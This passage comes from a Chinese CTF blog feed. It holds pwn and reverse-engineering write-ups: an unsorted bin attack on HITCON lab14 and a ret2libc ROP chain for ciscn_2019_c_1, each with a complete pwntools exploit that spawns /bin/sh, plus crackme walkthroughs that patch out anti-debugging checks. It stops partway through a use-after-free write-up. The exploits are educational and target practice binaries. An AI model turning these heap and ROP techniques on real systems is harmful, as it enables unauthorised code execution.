class="line">c.recvuntil(<span class="string">'is '</span>)</span><br><span class="line">atoi_addr = c.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">atoi_addr = u64(atoi_addr.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'atoi_addr = '</span> + hex(atoi_addr))</span><br><span class="line"></span><br><span class="line">libcbase = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(system))</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">c.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>[Unsorted bin attack] lab14 magic heap</title>
    <url>/2020/02/21/Unsorted-bin-attack-lab14-magic-heap/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/dad2-htptaqe3489779.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文是根据<code>CTF-WIKI</code>上<code>Unsorted bin attack</code>相关内容来写的，用来巩固一下相关知识，并以一道例题练手。</p><p>题目是HITCON Training lab14 magic heap:<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14" target="_blank" rel="noopener">下载地址</a></p><p>参考链接:</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" target="_blank" rel="noopener">CTF-WIKI</a></p><p><a href="https://v1ckydxp.github.io/2019/07/03/Unsorted-Bin-Attack-%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">某位师傅的博客</a></p><h1 id="0x01-知识回顾"><a href="#0x01-知识回顾" class="headerlink" title="0x01 知识回顾"></a>0x01 知识回顾</h1><p><code>利用前提</code>:能够控制 Unsorted Bin Chunk 的 bk 指针。</p><p><code>利用效果</code>:可以达到的效果是实现修改任意地址值为一个较大的数值。</p><h2 id="Unsorted-bin-基本来源"><a href="#Unsorted-bin-基本来源" class="headerlink" title="Unsorted bin 基本来源"></a>Unsorted bin 基本来源</h2><ol><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li><li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</li></ol><h2 id="Unsorted-bin-使用情况"><a href="#Unsorted-bin-使用情况" class="headerlink" title="Unsorted bin 使用情况"></a>Unsorted bin 使用情况</h2><ol><li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</li><li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。具体可以看下面的补充</li></ol><blockquote><p>在malloc的时候，如果是在libc版本&lt;2.26的情况下，如果在fastbin，small bin中找不到对应大小的chunk时，会尝试在Unsorted Bin中遍历，在这个过程中，如果找到对应大小的chunk，则会直接返回给用户。否则会将这些chunk插入对应的bin中；在libc2.26之后，引入tcache内存管理机制，如果申请的chunk的大小不在fastbin范围内，并且在tcache中找不到对应大小的堆块，会尝试在Unsorted Bin中寻找，在遍历的过程中，就算找到符合大小的堆块也不会立即返回。会将找到的符合的chunk放入对应tcache bin中直到bin中chunk的个数达到上限7，或者Unsorted Bin遍历结束。在Unsorted Bin遍历结束之后会，若之前找到至少一个符合大小的chunk，返回tcache bin中的最后一个，否则返回null。</p></blockquote><p>注意这里，是插入到unsorted bin的头部，然后取的时候从链表尾取出，这里可以联系一下数据结构中带头节点的链表，应该对理解这一块有帮助。头结点其实就相当于unsorted_chunks(av)</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>原理部分在CTF-WIKI里有相当详细的讲解。</p><p>最核心的部分应该是这四行以及修改p的bk指针为目的地址target-0x10(64位是-0x10,32位-0x08)</p><ul><li>victim = unsorted_chunks(av)-&gt;bk=p</li><li>bck = victim-&gt;bk=p-&gt;bk = target addr-16</li><li>unsorted_chunks(av)-&gt;bk = bck=target addr-16</li><li>bck-&gt;fd = *(target addr -16+16) = unsorted_chunks(av);</li></ul><p>这样也就将*target 的值修改为了unsorted bin 链表的头结点的地址了，这个地址往往是非常大的一个正数。</p><h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><ul><li>我们通过修改循环的次数来使得程序可以执行多次循环。</li><li>我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。</li></ul><h1 id="0x02-题目分析"><a href="#0x02-题目分析" class="headerlink" title="0x02 题目分析"></a>0x02 题目分析</h1><p>这是一道很简单很适合练习Unsorted bin attack的题目</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p>题目提供了四个功能</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> Create a Heap               </span><br><span class="line"><span class="number">2.</span> Edit a Heap                 </span><br><span class="line"><span class="number">3.</span> Delete a Heap               </span><br><span class="line"><span class="number">4.</span> Exit</span><br></pre></td></tr></table></figure><p>漏洞点在<code>edit_heap</code>里面，这个函数能够实现任意字节的堆溢出。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( choice == <span class="number">4869</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"So sad !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Congrt !"</span>);</span><br><span class="line">    l33t();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">l33t</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"cat ./flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，如果我们的choice输入4869，程序会判断magic的大小是否小于等于0x1305,如果不小于，则执行l33t函数，这个函数能够cat flag。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>程序特别简单，我们只需要让magic大于0x1305就好，而我们的unsorted bin attack就能实现这个目的。</p><p>创建3个chunk (其中chunk2是为了让chunk1与top chunk隔开)，delete掉chunk1，然后edit chunk0，通过堆溢出覆盖掉chunk1的bk，让bk为magic的地址-0x10，然后重新创建一个和chunk1大小一样的chunk。然后向程序输入4869、交互即可得到flag。</p><h1 id="0x03-完整EXP"><a href="#0x03-完整EXP" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./magicheap'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,cont)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Size of Heap : '</span>)</span><br><span class="line">    c.sendline(str(size))</span><br><span class="line">    c.recvuntil(<span class="string">'Content of heap:'</span>)</span><br><span class="line">    c.send(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,cont)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    c.sendline(<span class="string">'2'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line">    c.recvuntil(<span class="string">'Size of Heap : '</span>)</span><br><span class="line">    c.sendline(str(size))</span><br><span class="line">    c.recvuntil(<span class="string">'Content of heap : '</span>)</span><br><span class="line">    c.send(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    c.sendline(<span class="string">'3'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x6020C0</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">'bbbb'</span>)<span class="comment"># this size should not be in fastbins</span></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">'cccc'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = magic - <span class="number">0x10</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>,payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">c.sendline(<span class="string">'4869'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>WhaleCTF-rev2</title>
    <url>/2019/05/17/WhaleCTF-rev2/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/093832-1514252312123c.jpg" alt></p><a id="more"></a><ul><li>下载下来 拉入32位IDA查看主函数的伪代码。<br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190517220531.png" alt></li></ul><ul><li>看到了似曾相识的IsDebuggerPresent函数。</li></ul><blockquote><p>BOOL WINAPI IsDebuggerPresent( void );</p><p>这个函数的用途就是用来检查程序是否在ring 3调试器中运行,该函数位于Kernel32.dll中。</p><p>如果当前进程在调试器上下文中运行，则返回值为非零。</p><p>如果当前进程不在调试器上下文中运行，则返回值为零。</p></blockquote><ul><li><p>根据主函数, 先是一个if语句, 如果sub_40102A()函数或者IsDebuggerPresent()函数返回 Ture,则退出程序。</p></li><li><p>进入sub_40102A()函数,发现这个函数无论如何都会返回0,也就是假。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190517221401.png" alt></p><ul><li><p>搜了一番如何绕过IsDebuggerPresent()函数检测。</p></li><li><p>用OD载入定位到IsDebuggerPresent()函数。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190517222558.png" alt></p><ul><li>查看其调用树,在每次调用上都设断点。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190517222711.png" alt></p><ul><li>运行,然后发现程序断在这个位置。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190517222732.png" alt></p><ul><li>第一次先不做任何操作, 来单步看看有什么跳转么。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190517222933.png" alt></p><ul><li>依次单步, 发现这个je跳转, 跳转已实现, 会跳过第一个messageBosA来到第二个MessageBoxA。</li><li>但是第二个MessageBoxA会弹出一堆乱码, 并且下方就有Heapfree来释放堆了, 再往后就没有MessageBoxA函数了,并且再走几步就会Exit退出。</li><li>而根据IDA的静态分析, flag应该是通过MessageBoxA函数弹出的。 所以判断这个je跳转应该不让它实现跳转才对。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190517223007.png" alt></p><ul><li>所以直接最简单的方法, nop掉那个je跳转,或者je改为jne, 然后再次单步, 发现程序到了这个int3中断的地方就会退出程序。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190517223428.png" alt></p><ul><li>但至于为什么这个int3中断会导致程序退出, 还没找到合适的解释。但既然它会导致退出,无奈只能nop掉它, 然后接着单步。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190517223921.png" alt></p><ul><li>又是一个跳转, 发现这个跳转会直接跳转到Exit的位置, 所以不能让它跳转,直接nop掉。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190517224049.png" alt></p><ul><li>这时候call了一个MessageBoxA函数,弹出了一个窗口,但是里面没有内容,这仨按钮随便选一个就行, 然后又是一个跳转。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190517224222.png" alt></p><ul><li><p>既然第一个MessageBoxA没有弹出真正的flag个,那只能寄希望于第二个了, 而这个跳转会跳到堆释放的位置,然后结束,所以不能让它实现跳转,依然是nop掉它。</p></li><li><p>接着单步,得到flag。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190517224311.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/%E5%8A%A8%E6%BC%AB%E5%A5%B3%E7%94%9F%E9%92%A2%E7%90%B44K%E5%A3%81%E7%BA%B8_%E5%BD%BC%E5%B2%B8%E5%9B%BE%E7%BD%91.jpg" alt></p>]]></content>
      <categories>
        <category>逆向</category>
      </categories>
  </entry>
  <entry>
    <title>WhaleCTF-crackme(ais3)</title>
    <url>/2019/05/16/WhaleCTF-crackme-ais3/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/164052-15058968526ecf.jpg" alt></p><a id="more"></a><ul><li>下载下来文件以后发现是一个64位ELF文件。</li><li>64位IDA载入后查看主函数,F5查看伪代码。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190516160650.png" alt></p><ul><li>需要在执行的时候传入参数。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ( (unsigned int)verify(argv[1], argv, envp) )</span><br></pre></td></tr></table></figure><ul><li>这是一个关键判断,跳进去看看。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190516160819.png" alt></p><ul><li>双击encrypted 进入对应数据段。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190516160932.png" alt></p><ul><li><p>根据题意,如果所传参数在执行对应操作以后与encrypted数据段的数据对应相等,则提示成功。如果有一处不等,则提示错误。</p></li><li><p>写得算法如下。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/4.png" alt></p><ul><li>但是经过调试,发现有几个位置无法进行输出,如2 、4 、 6 、7等。</li><li>苦思冥想无果以后请教大佬。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/5.png" alt></p><ul><li><p>一句这TM用了溢出, 点醒了梦中人。</p></li><li><p>因为算法中执行了位操作,所以极有可能导致溢出,所以算法有缺陷。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/6.png" alt></p><ul><li>在后面加上&amp;0xff以后, 运行结果便正常了。</li></ul><blockquote><p>0xff表示取后两位。 例如: 0x1d1&amp;0xff 就是0xd1。</p></blockquote><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/%E5%88%9D%E9%9F%B3%E6%9C%AA%E6%9D%A5%E6%BC%82%E6%B5%81%E7%93%B64k%E5%8A%A8%E6%BC%AB%E5%A3%81%E7%BA%B8_%E5%BD%BC%E5%B2%B8%E5%9B%BE%E7%BD%91.jpg" alt></p>]]></content>
      <categories>
        <category>逆向</category>
      </categories>
  </entry>
  <entry>
    <title>ciscn_2019_c_1</title>
    <url>/2020/01/29/ciscn-2019-c-1/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/23716.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><ul><li>借助这道题目记录一下<code>LibcSearcher</code>的使用，当然这道题目用<code>DynELF</code>也可以。</li></ul><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200129143357.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200129143408.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200129143419.png" alt></p><ul><li><p>程序流程比较简单，在<code>encrypt</code>函数里由于使用的是<code>gets(s)</code>,存在栈溢出。但是程序会对我们输入的<code>字符串s</code>进行一系列异或操作。</p></li><li><p>这里需要注意这个<code>(unsigned int)x</code>。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200129143619.png" alt></p><ul><li><p>再看到下面的<code>++x;</code>，然后也可以推测出x的初始值为0。</p></li><li><p>这也就是说，只有当我们输入的字符串的长度大于x的值的时候，才会执行这一系列异或操作。</p></li><li><p>所以如果我们输入两次长度相等的字符串，那么只会对第一次输入的字符串进行异或。</p></li><li><p>由于程序没有后门函数，我们需要自己泄露libc了。</p></li></ul><h1 id="0x02泄露libc"><a href="#0x02泄露libc" class="headerlink" title="0x02泄露libc"></a>0x02泄露libc</h1><ul><li><p>我们可以通过用<code>puts</code>函数打印出<code>puts_got</code>的内容，从而通过<code>LibcSearcher</code>得到libc，进而得到<code>libcbase</code>、<code>system</code>、<code>/bin/sh</code>。</p></li><li><p>由于异或运算是可逆的，我们首先写出来一个<code>encrypt函数(实际上叫decrypt更合适)</code>，但是似乎不对payload进行encrypt也可以….</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(payload)</span>:</span></span><br><span class="line">    l = list(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(l)):</span><br><span class="line">        <span class="keyword">if</span> l[i].isdigit():</span><br><span class="line">            l[i] = chr(ord(l[i])^<span class="number">0xF</span>)</span><br><span class="line">        <span class="keyword">elif</span> l[i].isupper():</span><br><span class="line">            l[i] = chr(ord(l[i])^<span class="number">0xE</span>)</span><br><span class="line">        <span class="keyword">elif</span> l[i].islower():</span><br><span class="line">            l[i] = chr(ord(l[i])^<span class="number">0xD</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(l)</span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200129150505.png" alt></p><ul><li>简单构造一下payload用以输出<code>puts_got</code>的内容。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">elf = ELF(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line">main_addr = <span class="number">0x400B28</span></span><br><span class="line">pop_rdi = <span class="number">0x400C83</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'1'</span>*<span class="number">0x58</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br></pre></td></tr></table></figure><ul><li>获取<code>libcbase、system、binsh</code>。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c.recvuntil(<span class="string">'Ciphertext\n'</span>)</span><br><span class="line">c.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">puts_addr = u64(c.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'puts_addr = '</span> + hex(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">log.success(<span class="string">'libcbase = '</span> + hex(libcbase))</span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br></pre></td></tr></table></figure><h1 id="0x03-getshell"><a href="#0x03-getshell" class="headerlink" title="0x03 getshell"></a>0x03 getshell</h1><ul><li>这里需要注意一点</li></ul><blockquote><p>由于Ubuntu18运行机制与前面版本的不同，在调用system的时候需要进行栈对齐</p></blockquote><ul><li>我们可以使用<code>ret</code>进行栈对齐。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'1'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">payload_Ubuntu18 = <span class="string">'1'</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">c.sendline(payload_Ubuntu18)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x04-完整exp"><a href="#0x04-完整exp" class="headerlink" title="0x04 完整exp"></a>0x04 完整exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#c = process('./ciscn_2019_c_1')</span></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28201</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x400B28</span></span><br><span class="line">pop_rdi = <span class="number">0x400C83</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(payload)</span>:</span></span><br><span class="line">    l = list(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(l)):</span><br><span class="line">        <span class="keyword">if</span> l[i].isdigit():</span><br><span class="line">            l[i] = chr(ord(l[i])^<span class="number">0xF</span>)</span><br><span class="line">        <span class="keyword">elif</span> l[i].isupper():</span><br><span class="line">            l[i] = chr(ord(l[i])^<span class="number">0xE</span>)</span><br><span class="line">        <span class="keyword">elif</span> l[i].islower():</span><br><span class="line">            l[i] = chr(ord(l[i])^<span class="number">0xD</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(l)</span><br><span class="line"></span><br><span class="line">c.recv()</span><br><span class="line">c.sendline(<span class="string">'1'</span>)</span><br><span class="line">c.recvuntil(<span class="string">'encrypted\n'</span>)</span><br><span class="line">payload = <span class="string">'1'</span>*<span class="number">0x58</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">payload = encrypt(payload)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Ciphertext\n'</span>)</span><br><span class="line">c.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">puts_addr = u64(c.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'puts_addr = '</span> + hex(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">log.success(<span class="string">'libcbase = '</span> + hex(libcbase))</span><br><span class="line"></span><br><span class="line">c.recv()</span><br><span class="line">c.sendline(<span class="string">'1'</span>)</span><br><span class="line">c.recvuntil(<span class="string">'encrypted\n'</span>)</span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'1'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload_Ubuntu18 = <span class="string">'1'</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">c.sendline(payload_Ubuntu18)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h1><p><a href="https://blog.csdn.net/qinying001/article/details/103266763" target="_blank" rel="noopener">传送门</a></p><p><a href="https://blog.csdn.net/qq_43189757/article/details/100572092" target="_blank" rel="noopener">传送门</a></p>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>[UAF] lab 10 hacknote</title>
    <url>/2020/02/11/UAF-lab-10-hacknote/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/18044.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><strong>百闻不如一见</strong></p><ul><li>本文是对<code>CTF-WIKI</code>上<code>Use After Free</code>的一道例题的讲解。</li><li>题目链接: <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote" target="_blank" rel="noopener">题目链接</a></li></ul><ul><li><p>参考链接:</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/" target="_blank" rel="noopener">CTF-WIKI</a></p></li></ul><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><ul><li>32位程序，提供了4个选项。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. Add note          </span><br><span class="line">2. Delete note       </span><br><span class="line">3. Print note        </span><br><span class="line">4. Exit</span><br></pre></td></tr></table></figure><h2 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h2><ul><li><code>Add_note</code>： 程序会通过<code>malloc(8u)</code>申请一个chunk，这个chunk的结构如下：</li></ul><table><thead><tr><th>prev_size</th><th>size = 0x11</th></tr></thead><tbody><tr><td>puts函数指针</td><td>content指针</td></tr></tbody></table><ul><li>并且程序会根据用户输入的size申请一个chunk来读入content。</li></ul><table><thead><tr><th>prev_size | size</th></tr></thead><tbody><tr><td>content(由对应note的content指针所指向，其大小由用户输入的size决定)</td></tr></tbody></table><ul><li>这个函数出现了一个结构体，可以通过IDA将其还原，虽然不还原也不太影响读程序，但是还是练习一下还原结构体吧。</li></ul><p>首先在IDA中打开<code>Local types界面</code>，快捷键是<code>Shift+F1</code>，然后按<code>Insert</code>插入我们识别的结构体。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> (*myputs)();<span class="comment">//这里是函数指针</span></span><br><span class="line">    <span class="keyword">char</span> * content;</span><br><span 